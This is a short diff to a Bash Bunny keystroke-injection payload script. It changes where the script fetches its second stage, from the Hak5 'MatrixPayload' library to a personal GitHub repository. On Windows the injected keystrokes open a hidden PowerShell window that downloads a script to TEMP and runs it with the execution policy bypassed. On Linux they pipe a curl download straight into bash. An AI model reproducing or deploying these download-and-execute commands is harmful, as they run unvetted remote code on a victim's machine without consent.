@@ -43,7 +43,7 @@ WINDOWS)
     LED ATTACK
     QUACK GUI r
     sleep 1
-    QUACK STRING powershell -WindowStyle Hidden -Command "iwr -Uri 'https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/general/MatrixPayload/get.ps1' -OutFile \$env:TEMP\\matrix.ps1; powershell -ExecutionPolicy Bypass -File \$env:TEMP\\matrix.ps1"
+    QUACK STRING powershell -WindowStyle Hidden -Command "iwr -Uri 'https://raw.githubusercontent.com/RRMforLLM/mypayload/refs/heads/main/shunny/get.ps1' -OutFile \$env:TEMP\\matrix.ps1; powershell -ExecutionPolicy Bypass -File \$env:TEMP\\matrix.ps1"
     QUACK ENTER
     ;;
 LINUX)
@@ -51,7 +51,7 @@ LINUX)
     LED ATTACK
     QUACK ALT F2
     sleep 1
-    QUACK STRING "gnome-terminal -- bash -c 'curl -s https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/general/MatrixPayload/matrix.sh | bash; exec bash'"
+    QUACK STRING "gnome-terminal -- bash -c 'curl -s https://raw.githubusercontent.com/RRMforLLM/mypayload/refs/heads/main/shunny/matrix.sh | bash; exec bash'"
     QUACK ENTER
     ;;
 MACOS)
